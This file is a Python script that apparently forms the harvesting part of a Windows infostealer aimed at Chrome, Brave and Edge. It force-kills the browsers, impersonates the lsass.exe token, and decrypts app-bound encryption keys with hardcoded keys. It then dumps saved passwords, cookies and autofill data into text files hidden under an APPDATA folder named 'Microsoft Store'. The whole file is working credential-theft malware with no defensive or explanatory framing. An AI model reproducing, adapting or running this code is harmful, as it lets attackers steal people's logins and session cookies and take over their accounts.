import os
import io
import json
import struct
import ctypes
import shutil
import windows
import sqlite3
import pathlib
import binascii
import subprocess
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305

APPDATA = os.environ.get("APPDATA")
STORAGE_PATH = os.path.join(APPDATA, "Microsoft Store")
BROWSERS_OUTPUT = os.path.join(STORAGE_PATH, "Browsers")

BROWSERS = {
    'Chrome': {
        'name': 'Google Chrome',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'Brave': {
        'name': 'Brave',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'Edge': {
        'name': 'Microsoft Edge',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    }
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        parsed_data['raw_data'] = buffer.read()
    return parsed_data

def decrypt_with_cng(input_data, key_name="Google Chromekey1"):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                  ctypes.byref(pcbResult), 0x40)
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict, key_name="Google Chromekey1") -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    else:
        return parsed_data.get('raw_data', b'')

def decrypt_v20_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8')
    except Exception as e:
        return None

def decrypt_v20_password(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8')
    except Exception as e:
        return None

def fetch_sqlite_copy(db_path):
    tmp_path = pathlib.Path(os.environ['TEMP']) / pathlib.Path(db_path).name
    shutil.copy2(db_path, tmp_path)
    return tmp_path

def get_master_key(browser_config):
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = os.path.join(user_profile, browser_config['local_state'])
        
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
        elif "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])[5:]
            return windows.crypto.dpapi.unprotect(key_blob_encrypted)
        else:
            return None
            
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        
        if parsed_data['flag'] not in (1, 2, 3):
            return key_blob_user_decrypted[-32:]
            
        return derive_v20_master_key(parsed_data, browser_config['key_name'])
    except Exception as e:
        return None

def process_browser(browser_name, browser_config):
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        return
    
    master_key = get_master_key(browser_config)
    
    profiles = [p for p in browser_data_path.iterdir() if
                p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    
    for profile_dir in profiles:
        profile_name = profile_dir.name.lower()
        browser_output_dir = pathlib.Path(BROWSERS_OUTPUT) / browser_name
        profile_output_dir = browser_output_dir / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        cookie_db_path = profile_dir / "Network" / "Cookies"
        login_db_path = profile_dir / "Login Data"
        webdata_db_path = profile_dir / "Web Data"

        try:
            if cookie_db_path.exists():
                cookie_copy = fetch_sqlite_copy(cookie_db_path)
                con = sqlite3.connect(cookie_copy)
                cur = con.cursor()
                cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;")
                cookies = cur.fetchall()
                with open(cookies_file, "a", encoding="utf-8") as f:
                    for host, name, path, expires, secure, httponly, encrypted_value in cookies:
                        if encrypted_value and encrypted_value[:3] == b"v20":
                            decrypted = decrypt_v20_value(encrypted_value, master_key)
                            value_str = decrypted if decrypted else "DECRYPT_FAILED"
                            line = f"{host}\tTRUE\t{path}\t{str(secure).upper()}\t{2597573456}\t{name}\t{value_str}\n"
                            f.write(line)
                con.close()
        except:
            pass

        try:
            if login_db_path.exists():
                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
                logins = cur.fetchall()
                with open(password_file, "a", encoding="utf-8") as f:
                    for login in logins:
                        if login[2] and login[2][:3] == b"v20":
                            decrypted = decrypt_v20_password(login[2], master_key)
                            line = f"URL: {login[0]}\nLogin: {login[1]}\nPassword: {decrypted if decrypted else 'DECRYPT_FAILED'}\n\n"
                            f.write(line)
                con.close()
        except:
            pass

        try:
            if webdata_db_path.exists():
                con = sqlite3.connect(fetch_sqlite_copy(webdata_db_path))
                cur = con.cursor()
                cur.execute("SELECT name, value FROM autofill;")
                autofills = cur.fetchall()
                with open(autofill_file, "a", encoding="utf-8") as f:
                    for name, value in autofills:
                        if name and name.strip():
                            if isinstance(value, bytes) and value[:3] == b"v20":
                                decrypted = decrypt_v20_value(value, master_key)
                                value_str = decrypted if decrypted else "DECRYPT_FAILED"
                            else:
                                value_str = value
                            line = f"Field: {name}\nValue: {value_str}\n\n"
                            f.write(line)
                con.close()
        except:
            pass

def main():
    for browser_name, browser_config in BROWSERS.items():
        try:
            subprocess.run(["taskkill", "/F", "/IM", browser_config['process_name']], 
                         capture_output=True, text=True)
        except:
            pass
    
    keys_output_dir = pathlib.Path(STORAGE_PATH) / "Decrypted Keys"
    keys_output_dir.mkdir(exist_ok=True)
    
    for browser_name, browser_config in BROWSERS.items():
        user_profile = os.environ['USERPROFILE']
        browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
        
        if not browser_data_path.exists():
            continue
        
        master_key = get_master_key(browser_config)
        
        if master_key:
            key_file = keys_output_dir / f"{browser_name}_master_key.txt"
            with open(key_file, "w", encoding="utf-8") as f:
                f.write(f"Browser: {browser_config['name']}\n")
                f.write(f"Master Key (hex): {master_key.hex()}\n")
                f.write(f"Master Key (base64): {binascii.b2a_base64(master_key).decode().strip()}\n")
    
    for browser_name, browser_config in BROWSERS.items():
        user_profile = os.environ['USERPROFILE']
        browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
        
        if browser_data_path.exists():
            process_browser(browser_name, browser_config)

    cookie_count = 0
    password_count = 0
    for browser_name in os.listdir(BROWSERS_OUTPUT):
        browser_folder = os.path.join(BROWSERS_OUTPUT, browser_name)
        if os.path.isdir(browser_folder):
            cookies_path = os.path.join(browser_folder, "Default", "cookies.txt")
            if os.path.exists(cookies_path):
                with open(cookies_path, "r", encoding="utf-8") as f:
                    cookie_count += sum(1 for _ in f if _.strip())
            pw_path = os.path.join(browser_folder, "Default", "passwords.txt")
            if os.path.exists(pw_path):
                with open(pw_path, "r", encoding="utf-8") as f:
                    password_count += sum(1 for line in f if line.strip().startswith("URL:"))

    counts = {"cookie_count": cookie_count, "password_count": password_count}
    with open(os.path.join(STORAGE_PATH, "main_counts.json"), "w", encoding="utf-8") as f:
        json.dump(counts, f)

if __name__ == "__main__":
    if not is_admin():
        print("This script must be run as an administrator.")
    else:
        main()
